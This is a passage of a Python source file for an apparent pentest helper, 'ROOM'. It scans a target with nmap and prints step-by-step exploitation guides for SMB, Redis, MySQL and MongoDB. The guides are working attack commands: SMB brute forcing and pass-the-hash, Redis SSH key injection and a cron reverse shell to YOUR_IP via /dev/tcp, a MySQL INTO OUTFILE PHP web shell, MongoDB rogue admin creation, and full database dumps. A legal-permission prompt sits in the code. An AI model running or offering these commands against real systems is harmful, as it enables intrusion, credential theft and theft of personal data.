                     "Replace SHARE_NAME with shares found in Phase 1. Once connected: ls to list, get filename to download files, put file to upload."),
                    ("Mount share locally", "mkdir /mnt/smb && mount -t cifs //{t}/SHARE_NAME /mnt/smb -o guest",
                     "Mount the share like a local drive. Then browse with normal file commands. Much easier than smbclient for reading many files."),
                    ("CrackMapExec with credentials", "crackmapexec smb {t} -u admin -p password --shares",
                     "If you found credentials elsewhere, try them against SMB. --shares shows which shares this user can access."),
                ],
                "what_to_note": "Which shares are accessible, what files are readable, any credentials or sensitive data found.",
            },
            {
                "name": "PHASE 5 — Credential Attacks",
                "desc": "Brute force or relay attacks when null session fails.",
                "steps": [
                    ("Brute force", "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://{t}",
                     "Try username/password combinations. Use the user list from enum4linux. SMB brute force can be slow — use a targeted password list."),
                    ("Pass the Hash", "crackmapexec smb {t} -u administrator -H NTLM_HASH",
                     "If you captured an NTLM hash (from Responder or mimikatz), you can authenticate without cracking it. Replace NTLM_HASH with the hash you captured."),
                ],
                "what_to_note": "Valid credentials, hash reuse across machines.",
            },
        ],
        "chain": [
            ("MS17-010 EternalBlue", "→", "SYSTEM shell immediately", "→", "Dump all credentials with mimikatz", "→", "Pass-the-hash to other machines"),
            ("Null session", "→", "List users via enum4linux", "→", "Brute force SSH/RDP with found usernames", "→", "Shell access"),
            ("Readable share", "→", "Find credentials in files", "→", "Login to web app / DB / SSH with found creds"),
            ("SMB signing disabled", "→", "NTLM relay attack with Responder", "→", "Capture and relay hashes", "→", "Admin access"),
        ],
    },
    6379: {
        "title": "Redis — Full Exploitation Guide",
        "intro": "Redis is often the quickest win on a pentest. No authentication by default means you are in the moment you connect. From there, RCE is usually just a few commands away.",
        "phases": [
            {
                "name": "PHASE 1 — Confirm Access",
                "desc": "Verify Redis is accessible without authentication.",
                "steps": [
                    ("Ping test", "redis-cli -h {t} ping",
                     "If you get PONG back — Redis has no password and you have full access. If you get an error about authentication — try common passwords next."),
                    ("Get server info", "redis-cli -h {t} info server",
                     "Shows Redis version, OS, config file location, data directory. All critical for exploitation. Note the config_file path and the dir value."),
                    ("Try common passwords", "redis-cli -h {t} -a password\nredis-cli -h {t} -a redis\nredis-cli -h {t} -a 123456",
                     "If authentication is required, try these common Redis passwords before giving up."),
                ],
                "what_to_note": "Whether auth is required, Redis version, config file path, data directory path.",
            },
            {
                "name": "PHASE 2 — Data Extraction",
                "desc": "Read everything stored in Redis — often contains session tokens, credentials, and sensitive app data.",
                "steps": [
                    ("List all keys", "redis-cli -h {t} keys '*'",
                     "Lists every key in the database. Look for: session:, user:, token:, password:, admin:, jwt:, auth:"),
                    ("Read specific keys", "redis-cli -h {t} get 'session:abc123'",
                     "Read the value of any key. Session tokens can be used to hijack user accounts in the web app. Passwords may be stored in plaintext."),
                    ("Dump all data", "redis-cli -h {t} --scan | xargs -I {} redis-cli -h {t} get {}",
                     "Dumps the value of every single key. Redirect to a file: > redis_dump.txt for offline analysis."),
                ],
                "what_to_note": "Session tokens, passwords, usernames, API keys, JWT tokens.",
            },
            {
                "name": "PHASE 3 — RCE via SSH Key Injection",
                "desc": "Write your own SSH public key into root's authorized_keys file. Requires Redis running as root or having write access to /root.",
                "steps": [
                    ("Generate SSH key", "ssh-keygen -t rsa -f /tmp/redis_rsa -N ''",
                     "Generate a new SSH key pair. The private key stays on your machine, the public key gets injected into the target."),
                    ("Inject public key", "redis-cli -h {t} config set dir /root/.ssh\nredis-cli -h {t} config set dbfilename authorized_keys\nredis-cli -h {t} set pwn \"\\n\\n$(cat /tmp/redis_rsa.pub)\\n\\n\"\nredis-cli -h {t} bgsave",
                     "This changes Redis's save directory to /root/.ssh, sets the filename to authorized_keys, writes your public key as a value, then saves to disk. The newlines ensure your key is on its own line."),
                    ("SSH in as root", "ssh -i /tmp/redis_rsa root@{t}",
                     "If the injection worked, you now have passwordless SSH access as root. Full system compromise."),
                ],
                "what_to_note": "Whether config set dir worked (some versions restrict this), whether bgsave succeeded.",
            },
            {
                "name": "PHASE 4 — RCE via Cron Job",
                "desc": "Alternative RCE method — write a cron job that sends you a reverse shell.",
                "steps": [
                    ("Start listener", "nc -lvnp 4444",
                     "Start this on YOUR machine first. Replace 4444 with your preferred port."),
                    ("Write cron reverse shell", "redis-cli -h {t} config set dir /var/spool/cron\nredis-cli -h {t} config set dbfilename root\nredis-cli -h {t} set cron \"\\n\\n* * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\\n\\n\"\nredis-cli -h {t} bgsave",
                     "Writes a cron job that runs every minute and sends a reverse shell to YOUR_IP:4444. Replace YOUR_IP with your machine's IP address. Wait up to 60 seconds for the shell."),
                ],
                "what_to_note": "Whether cron directory is writable, connection received on listener.",
            },
        ],
        "chain": [
            ("Redis no auth", "→", "Read session tokens", "→", "Hijack admin session in web app", "→", "File upload in web app", "→", "Web shell RCE"),
            ("Redis no auth", "→", "SSH key injection", "→", "Root shell via SSH"),
            ("Redis no auth", "→", "Cron job reverse shell", "→", "Root shell"),
            ("Redis credentials in keys", "→", "Password reuse on SSH/MySQL/web app"),
        ],
    },
    3306: {
        "title": "MySQL — Full Exploitation Guide",
        "intro": "Internet-facing MySQL is almost always a critical finding. The goal is credentials first, then data extraction, then trying to turn DB access into OS access.",
        "phases": [
            {
                "name": "PHASE 1 — Connect & Enumerate",
                "desc": "Try to connect and understand what's inside.",
                "steps": [
                    ("Try root with no password", "mysql -h {t} -u root",
                     "The most common finding. If it connects without a password — you have full database access immediately."),
                    ("Nmap MySQL scripts", "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum,mysql-databases -sV {t}",
                     "mysql-empty-password checks for accounts with no password. mysql-databases lists all databases if access is granted. Run this before manual attempts."),
                    ("List databases", "SHOW DATABASES;",
                     "Once connected, this lists all databases. Look for: wordpress, joomla, webapp, users, customers, accounts — anything that sounds like it has valuable data."),
                ],
                "what_to_note": "Empty password accounts, database names, MySQL version.",
            },
            {
                "name": "PHASE 2 — Data Extraction",
                "desc": "Pull out credentials and sensitive data.",
                "steps": [
                    ("Dump user tables", "USE wordpress;\nSHOW TABLES;\nSELECT * FROM wp_users;",
                     "WordPress stores hashed passwords in wp_users. Joomla uses jos_users. Generic apps often use 'users' or 'accounts'. Look for username + password hash columns."),
                    ("Get MySQL user hashes", "SELECT user,authentication_string,host FROM mysql.user;",
                     "Dumps the MySQL user accounts and their password hashes. Crack these offline with hashcat — they give access back to MySQL even after password changes."),
                    ("mysqldump everything", "mysqldump -h {t} -u root --all-databases > dump.sql",
                     "Dumps every database to a file for offline analysis. Contains all data including credentials, emails, personal info."),
                ],
                "what_to_note": "Password hashes found, plaintext passwords, email addresses, API keys in config tables.",
            },
            {
                "name": "PHASE 3 — RCE via INTO OUTFILE",
                "desc": "If MySQL can write files, plant a web shell.",
                "steps": [
                    ("Check write permissions", "SELECT @@secure_file_priv;",
                     "If result is empty or NULL — MySQL can write files anywhere. If it shows a path — can only write there. If it shows 'disabled' — file write is off."),
                    ("Write web shell", "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
                     "Writes a PHP web shell to the web root. Then access it: curl 'http://{t}/shell.php?cmd=id'"),
                    ("Test shell", "curl 'http://{t}/shell.php?cmd=id'",
                     "If you see the output of 'id' command — you have Remote Code Execution through the web server. Now get a proper reverse shell."),
                ],
                "what_to_note": "Whether file write works, web root location, shell access level.",
            },
            {
                "name": "PHASE 4 — Brute Force",
                "desc": "If anonymous access fails, brute force credentials.",
                "steps": [
                    ("Hydra MySQL brute", "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{t}",
                     "Try root account first, then common MySQL usernames: mysql, admin, dbadmin, webapp."),
                    ("Nmap brute", "nmap -p3306 --script mysql-brute --script-args userdb=users.txt {t}",
                     "Quick brute force using nmap. Use a short, targeted wordlist for speed."),
                ],
                "what_to_note": "Valid username/password combinations.",
            },
        ],
        "chain": [
            ("MySQL root no password", "→", "Dump wp_users hashes", "→", "Crack with hashcat", "→", "Login to WordPress admin", "→", "Plugin editor RCE"),
            ("MySQL write access", "→", "INTO OUTFILE web shell", "→", "RCE", "→", "Reverse shell", "→", "Privesc"),
            ("MySQL credentials", "→", "Password reuse on SSH", "→", "Shell access"),
            ("MySQL data dump", "→", "Find API keys / secrets", "→", "Access other services"),
        ],
    },
    27017: {
        "title": "MongoDB — Full Exploitation Guide",
        "intro": "MongoDB with no authentication is one of the easiest wins in network pentesting. Millions of records have been stolen from exposed MongoDB instances.",
        "phases": [
            {
                "name": "PHASE 1 — Connect & Confirm",
                "desc": "Verify access and understand the database structure.",
                "steps": [
                    ("Connect with no auth", "mongo {t}:27017",
                     "If you connect without being asked for credentials — full access confirmed. You can read, write, and delete everything."),
                    ("Nmap scripts", "nmap -p27017 --script mongodb-info,mongodb-databases {t}",
                     "mongodb-info shows server version and configuration. mongodb-databases lists all databases. Run this first for a quick overview."),
                    ("List databases", "show dbs",
                     "Inside the mongo shell, this shows all databases and their sizes. Large databases are the most valuable targets."),
                ],
                "what_to_note": "All database names, sizes, MongoDB version.",
            },
            {
                "name": "PHASE 2 — Data Extraction",
                "desc": "Find and extract sensitive data.",
                "steps": [
                    ("Enumerate collections", "use <database>\nshow collections",
                     "Switch to each database and list collections (MongoDB's equivalent of tables). Look for: users, accounts, sessions, orders, emails, tokens."),
                    ("Dump all documents", "db.<collection>.find().pretty()",
                     "Dumps all documents in a collection. .pretty() formats it readably. This reveals all stored data including passwords, emails, personal info."),
                    ("Full database dump", "mongodump --host {t} --out /tmp/mongodump",
                     "Dumps every database to your machine. Creates BSON files you can analyse offline with mongorestore or bsondump."),
                    ("Search for passwords", "db.users.find({},{password:1,username:1})",
                     "Project only username and password fields. Quickly shows if passwords are stored in plaintext or hashed."),
                ],
                "what_to_note": "User credentials, session tokens, PII, payment data, API keys.",
            },
            {
                "name": "PHASE 3 — Write Access",
                "desc": "If you can write, you can add admin accounts or modify data.",
                "steps": [
                    ("Add admin user (web app)", "db.users.insert({username:'hacker',password:'hacked123',role:'admin'})",
                     "If the web app uses MongoDB for auth, inserting an admin user gives you web app access. Check the existing user documents first to understand the schema."),
                    ("Modify existing user", "db.users.update({username:'admin'},{$set:{password:'newpassword'}})",
                     "Change an existing admin's password. Useful when you need to access the web app as admin but don't know their password."),
                ],
                "what_to_note": "Schema of user documents, role/permission field names.",
            },
        ],
        "chain": [
            ("MongoDB no auth", "→", "Dump users collection", "→", "Plaintext passwords", "→", "Login to web app as admin", "→", "File upload RCE"),
            ("MongoDB no auth", "→", "Find session tokens", "→", "Hijack admin web session"),
            ("MongoDB credentials found", "→", "Password reuse on SSH / web app"),
            ("MongoDB no auth", "→", "Modify admin password", "→", "Login to web app", "→", "Further exploitation"),
        ],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
#  INSTALLER
# ─────────────────────────────────────────────────────────────────────────────
def tool_exists(name):
    return shutil.which(name) is not None


def run_install():
    print(BANNER)
    print(f"{W}  ROOM — Dependency Checker & Installer{RST}")
    print(f"{B}  ─────────────────────────────────────────────────────{RST}\n")

    if IS_WINDOWS:
        print(f"  {Y}Detected: Windows{RST}\n")
        print(f"  {W}Most tools are Linux-only. Recommended:{RST}")
        print(f"  {Y}1.{RST} Install nmap → {C}https://nmap.org/download.html{RST}")
        print(f"  {Y}2.{RST} Use WSL with Kali → {C}wsl --install -d kali-linux{RST}")
        if tool_exists("nmap"):
            print(f"\n  {G}✓ nmap found — basic scanning will work{RST}")
        else:
            print(f"\n  {R}✗ nmap not found — download from nmap.org{RST}")
        print()
        return

    tools = [
        ("nmap",       "nmap",        "Core port scanner — required"),
        ("curl",       "curl",        "HTTP header analysis"),
        ("hydra",      "hydra",       "Credential brute-forcing"),
        ("nikto",      "nikto",       "Web vulnerability scanner"),
        ("gobuster",   "gobuster",    "Directory enumeration"),
        ("dig",        "dnsutils",    "DNS zone transfer"),
        ("enum4linux", "enum4linux",  "SMB/NetBIOS enumeration"),
        ("smbclient",  "smbclient",   "SMB share access"),
        ("redis-cli",  "redis-tools", "Redis testing"),
        ("whatweb",    "whatweb",     "Web fingerprinting"),
        ("sqlmap",     "sqlmap",      "SQL injection testing"),
        ("wpscan",     "wpscan",      "WordPress scanning"),
    ]

    missing = []
    print(f"  {Y}Detected: {platform.system()}{RST}\n")
    print(f"  {W}{'Tool':<14} {'Status':<16} Purpose{RST}")
    print(f"  {'─'*14} {'─'*16} {'─'*30}")

    for tool, pkg, purpose in tools:
        found = tool_exists(tool)
        status = f"{G}✓ installed   {RST}" if found else f"{R}✗ missing     {RST}"
        print(f"  {W}{tool:<14}{RST} {status} {DIM}{purpose}{RST}")
        if not found:
            missing.append((tool, pkg))

    print()
    if not missing:
        print(f"  {G}✓ All tools installed — ROOM is ready!{RST}\n")
        return

    confirm = input(f"  {C}Install {len(missing)} missing tool(s) now? (yes/no): {RST}").strip().lower()
    if confirm not in ("yes","y"):
        print(f"\n  {DIM}Install manually: sudo apt install -y {' '.join(p for _,p in missing)}{RST}\n")
        return

    cmd = f"sudo apt install -y {' '.join(p for _,p in missing)}"
    subprocess.run(cmd.split())
    print(f"\n  {G}Done! Try: python3 room.py scanme.nmap.org{RST}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  EXPLOIT GUIDE PRINTER
# ─────────────────────────────────────────────────────────────────────────────
def print_exploit_guide(port: int, target: str):
    import random
    guide = EXPLOIT_GUIDE.get(port)
    if not guide:
        kb = KB.get(port)
        if kb:
            print(f"\n  {Y}No detailed exploit guide for port {port} yet.{RST}")
            print(f"  {DIM}Here are the recon commands to start with:{RST}\n")
            for i, cmd in enumerate(kb["commands"], 1):
                print(f"  {Y}{i}.{RST} {cmd.replace('{t}', target)}")
        else:
            print(f"\n  {Y}Port {port} not in knowledge base.{RST}")
            print(f"  {DIM}Try: nmap -p{port} --script banner,version {target}{RST}")
            print(f"  {DIM}     nc {target} {port}   # banner grab{RST}")
            print(f"  {DIM}     searchsploit <service_name>{RST}")
        return

    print(f"\n{M}  ══════════════════════════════════════════════════════{RST}")
    print(f"{W}  {guide['title']}{RST}")
    print(f"{M}  ══════════════════════════════════════════════════════{RST}")
    print(f"\n  {C}{random.choice(LAW_QUOTES)}{RST}\n")
    print(f"  {DIM}{guide['intro']}{RST}\n")

    for phase in guide["phases"]:
        print(f"\n{B}  ┌─────────────────────────────────────────────────{RST}")
        print(f"{B}  │{RST} {Y}{phase['name']}{RST}")
        print(f"{B}  │{RST} {DIM}{phase['desc']}{RST}")
        print(f"{B}  └─────────────────────────────────────────────────{RST}\n")

        for step_name, cmd, explanation in phase["steps"]:
            print(f"  {G}▶ {W}{step_name}{RST}")
            # Command(s) — handle multi-line
            for line in cmd.replace("{t}", target).splitlines():
                print(f"    {Y}$ {line}{RST}")
            # Explanation
            print(f"\n    {DIM}", end="")
            for line in explanation.splitlines():
                print(f"  {line}")
            print(f"{RST}")

        if "what_to_note" in phase:
            print(f"  {C}📝 Note:{RST} {phase['what_to_note']}\n")

    # Vulnerability chain
    print(f"\n{M}  ──────────────────────────────────────────────────────{RST}")
    print(f"{W}  VULNERABILITY CHAINS — How this leads to more{RST}")
    print(f"{M}  ──────────────────────────────────────────────────────{RST}\n")
    for chain in guide["chain"]:
        parts = []
        for item in chain:
            if item == "→":
                parts.append(f"{C}→{RST}")
            else:
                parts.append(f"{Y}{item}{RST}")
        print(f"  {'  '.join(parts)}\n")

    print(f"\n  {M}\"Room.\" — Trafalgar D. Water Law{RST}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  INTERACTIVE MENU
# ─────────────────────────────────────────────────────────────────────────────
def interactive_menu(ports: list, target: str):
    while True:
        print(f"\n{M}  ══════════════════════════════════════════════════════{RST}")
        print(f"{W}  ROOM — Exploit Guide Menu{RST}")
        print(f"{M}  ══════════════════════════════════════════════════════{RST}\n")
        print(f"  {DIM}Target: {target}{RST}\n")
        print(f"  {W}Open ports found:{RST}\n")

        known   = [(p, KB[p["port"]]) for p in ports if p["port"] in KB]
        unknown = [p for p in ports if p["port"] not in KB]

        for i, (p, info) in enumerate(known, 1):
            sev_col, sev_label = SEV[info["severity"]]
            has_guide = "📖" if p["port"] in EXPLOIT_GUIDE else "  "
            print(f"  {Y}[{i}]{RST} Port {W}{p['port']:>5}{RST}  {C}{info['name']:<15}{RST}  {sev_col}[{sev_label}]{RST}  {has_guide}")

        for p in unknown:
            print(f"  {DIM}[ ] Port {p['port']:>5}  {p['service']:<15}  [UNKNOWN]{RST}")

        print(f"\n  {Y}[p]{RST} Type a port number directly")
        print(f"  {Y}[q]{RST} Quit\n")
        print(f"  {M}📖 = Full step-by-step exploit guide available{RST}\n")

        choice = input(f"  {C}Select option: {RST}").strip().lower()

        if choice == "q":
            print(f"\n  {M}\"I've already decided... I will never bow to anyone again.\" — Law{RST}\n")
            break
        elif choice == "p":
            port_input = input(f"  {C}Enter port number: {RST}").strip()
            if port_input.isdigit():
                print_exploit_guide(int(port_input), target)
            else:
                print(f"  {R}Invalid port number.{RST}")
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(known):
                p, _ = known[idx]
                print_exploit_guide(p["port"], target)
            else:
                print(f"  {R}Invalid selection.{RST}")
        else:
            print(f"  {R}Invalid option — enter a number, 'p', or 'q'.{RST}")

        input(f"\n  {DIM}Press Enter to return to menu...{RST}")


# ─────────────────────────────────────────────────────────────────────────────
#  KNOWLEDGE BASE ANALYSIS
# ─────────────────────────────────────────────────────────────────────────────
def analyze_ports(ports: list, target: str):
    print(f"\n  {G}Found {len(ports)} open port(s):{RST}\n")
    sorted_ports = sorted(ports, key=lambda p: KB.get(p["port"], {}).get("severity", 0), reverse=True)
    analyzed, unknown = [], []

    for p in sorted_ports:
        info = KB.get(p["port"])
        if info:
            analyzed.append((p, info))
        else:
            unknown.append(p)

    for p, info in analyzed:
        sev_col, sev_label = SEV[info["severity"]]
        has_guide = f"  {M}[Full exploit guide available]{RST}" if p["port"] in EXPLOIT_GUIDE else ""
        print(f"  {B}{'─'*55}{RST}")
        print(f"  {W}PORT {p['port']}/{p['proto']}  —  {info['name']}{RST}  {sev_col}[{sev_label}]{RST}{has_guide}")
        if p.get("version"):
            print(f"  {DIM}  Version: {p['version']}{RST}")
        print(f"\n  {W}What it is:{RST}  {info['what']}")
        print(f"  {W}Risk:{RST}       {Y}{info['why']}{RST}")
        if info.get("cves"):
            print(f"  {W}CVEs:{RST}       {R}{' | '.join(info['cves'])}{RST}")
        print(f"\n  {W}Quick commands:{RST}")
        for i, cmd in enumerate(info["commands"][:3], 1):
            print(f"    {Y}{i}.{RST} {cmd.replace('{t}', target)}")
        print(f"\n  {W}Look for:{RST}")
        for item in info["look_for"][:3]:
            print(f"    {C}▸{RST} {item}")
        print()

    if unknown:
        print(f"  {B}{'─'*55}{RST}")
        print(f"  {W}UNKNOWN PORTS{RST}  {DIM}(investigate manually){RST}\n")
        for p in unknown:
            print(f"  {G}[+]{RST} Port {W}{p['port']}/{p['proto']}{RST}  ({p['service']}  {DIM}{p['version']}{RST})")
            print(f"    {Y}▸{RST} nmap -p{p['port']} --script banner,version {target}")
            print(f"    {Y}▸{RST} nc {target} {p['port']}")
            print()

    if analyzed:
        print(f"  {B}{'─'*55}{RST}")
        print(f"  {G}{W}PRIORITY ORDER:{RST}\n")
        for i, (p, info) in enumerate(analyzed, 1):
            sev_col, sev_label = SEV[info["severity"]]
            print(f"  {Y}{i}.{RST} Port {p['port']} ({info['name']})  {sev_col}[{sev_label}]{RST}")
        top_p, top_info = analyzed[0]
        print(f"\n  {G}{W}QUICK WIN:{RST}")
        print(f"  Port {top_p['port']} ({top_info['name']}) — {top_info['why'].split('.')[0]}.")
        print(f"  {Y}▸ {top_info['commands'][0].replace('{t}', target)}{RST}\n")


def check_http_headers(target: str, ports: list):
    SECURITY_HEADERS = {
        "strict-transport-security": ("HSTS missing",            "Allows SSL stripping"),
        "content-security-policy":   ("CSP missing",             "Allows XSS"),
        "x-frame-options":           ("X-Frame-Options missing", "Allows clickjacking"),
        "x-content-type-options":    ("X-Content-Type missing",  "Allows MIME sniffing"),
    }
    INFO_LEAK = ["server", "x-powered-by", "x-aspnet-version", "x-generator"]

    for p in ports:
        scheme = "https" if p["port"] in (443, 8443) else "http"
        url = f"{scheme}://{target}:{p['port']}"
        print(f"\n  {C}● {url}{RST}")
        try:
            r = subprocess.run(["curl","-sI","--max-time","10","--insecure",url], capture_output=True, text=True)
            raw = r.stdout
        except FileNotFoundError:
            print(f"  {Y}curl not found — run: python3 room.py --install{RST}")
            continue
        hmap = {}
        for line in raw.splitlines():
            if ":" in line:
                k,_,v = line.partition(":")
                hmap[k.strip().lower()] = v.strip()
        for h in INFO_LEAK:
            if h in hmap:
                print(f"  {Y}INFO LEAK  {W}{h}:{RST} {hmap[h]}")
        for h,(label,risk) in SECURITY_HEADERS.items():
            if h not in hmap:
                print(f"  {R}MISSING    {W}{label}:{RST} {DIM}{risk}{RST}")
        for line in raw.splitlines()[:10]:
            print(f"  {DIM}  {line}{RST}")


def run_nmap(target, flags, label):
    print(f"  {DIM}▸ nmap {flags} {target}{RST}")
    try:
        r = subprocess.run(["nmap"]+flags.split()+[target], capture_output=True, text=True, timeout=600)
        return r.stdout
    except FileNotFoundError:
        print(f"  {R}[!] nmap not found — run: python3 room.py --install{RST}")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print(f"  {Y}[!] Timed out: {label}{RST}")
        return ""


def parse_open_ports(out):
    ports = []
    for line in out.splitlines():
        m = re.match(r"^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line)
        if m:
            ports.append({"port":int(m.group(1)),"proto":m.group(2),"service":m.group(3),"version":m.group(4).strip()})
    return ports


def section(title):
    print(f"\n{B}{'─'*58}{RST}")
    print(f"{W}  {title}{RST}")
    print(f"{B}{'─'*58}{RST}\n")


def scan(target, mode):
    import random
    print(BANNER)
    print(f"  {M}{random.choice(LAW_QUOTES)}{RST}\n")

    section("1 / Target Resolution")
    try:
        ip = socket.gethostbyname(target)
        print(f"  {G}[+]{RST} {target} → {W}{ip}{RST}")
    except socket.gaierror:
        print(f"  {R}[!] Cannot resolve: {target}{RST}")
        sys.exit(1)
    print(f"  {DIM}Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RST}")
    print(f"  {DIM}Mode    : {mode}{RST}")

    all_raw, all_ports = "", []

    section("2 / Service Scan (Top 1000 Ports)")
    out = run_nmap(target, "-sV --open -T4", "service scan")
    print(out); all_raw += out; all_ports += parse_open_ports(out)

    if mode in ("full","all"):
        section("3 / Full Port Scan (1–65535)")
        out = run_nmap(target, "-p- --open -T4", "full range")
        print(out); all_raw += out; all_ports += parse_open_ports(out)

    if mode == "all":
        section("4 / OS Detection")
        out = run_nmap(target, "-O -sV --version-intensity 7", "OS detect")
        print(out); all_raw += out

    if mode == "all":
        section("5 / NSE Vulnerability Scripts")
        out = run_nmap(target, "--script vuln -T4", "vuln scripts")
        print(out); all_raw += out; all_ports += parse_open_ports(out)

    seen, unique = set(), []
    for p in all_ports:
        if p["port"] not in seen:
            seen.add(p["port"]); unique.append(p)

    if not unique:
        print(f"\n{Y}  No open ports found. Try --mode full.{RST}\n")
        return

    web = [p for p in unique if p["port"] in (80,443,8080,8443,8000,8888)]
    if web and mode in ("full","all"):
        section("6 / HTTP Security Header Review")
        check_http_headers(target, web)

    section("✦ Guided Vulnerability Analysis")
    analyze_ports(unique, target)

    section("✦ Scan Complete")
    print(f"  {W}Target     :{RST} {target}  ({ip})")
    print(f"  {W}Mode       :{RST} {mode}")
    print(f"  {W}Open ports :{RST} {G}{len(unique)}{RST}  →  {Y}{', '.join(str(p['port']) for p in unique)}{RST}")
    print(f"\n  {DIM}Tip: run with --mode all for the deepest scan{RST}")
    print(f"  {R}  Legal: only scan systems you own or have permission to test{RST}\n")

    # Launch interactive menu
    print(f"\n{M}  ══════════════════════════════════════════════════════{RST}")
    print(f"{W}  Want a step-by-step exploitation guide?{RST}")
    print(f"{M}  ══════════════════════════════════════════════════════{RST}")
    go = input(f"\n  {C}Open exploit guide menu? (yes/no): {RST}").strip().lower()
    if go in ("yes","y"):
        interactive_menu(unique, target)


def main():
    if len(sys.argv) == 1 or "--help" in sys.argv or "-h" in sys.argv:
        print(HELP_SCREEN); sys.exit(0)

    if "--install" in sys.argv:
        run_install(); sys.exit(0)

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("target", nargs="?", default=None)
    parser.add_argument("--mode", choices=["quick","full","all"], default="quick")
    parser.add_argument("--exploit", type=int, default=None)
    parser.add_argument("--target", dest="exploit_target", default=None)
    parser.add_argument("--help","-h", action="store_true")
    parser.add_argument("--install", action="store_true")
    args = parser.parse_args()

    # Direct exploit guide mode
    if args.exploit:
        t = args.exploit_target or input(f"{C}Target IP/hostname: {RST}").strip()
        print(BANNER)
        print_exploit_guide(args.exploit, t)
        sys.exit(0)

    if not args.target:
        print(HELP_SCREEN); sys.exit(0)

    print(f"\n{R}[!] LEGAL NOTICE:{RST} Only scan systems you own or have explicit permission to test.")
    confirm = input(f"{Y}    Confirm permission to scan {args.target}? (yes/no): {RST}").strip().lower()
    if confirm not in ("yes","y"):
        print(f"{R}  Aborted.{RST}\n"); sys.exit(0)

    scan(args.target, args.mode)


if __name__ == "__main__":
    main()
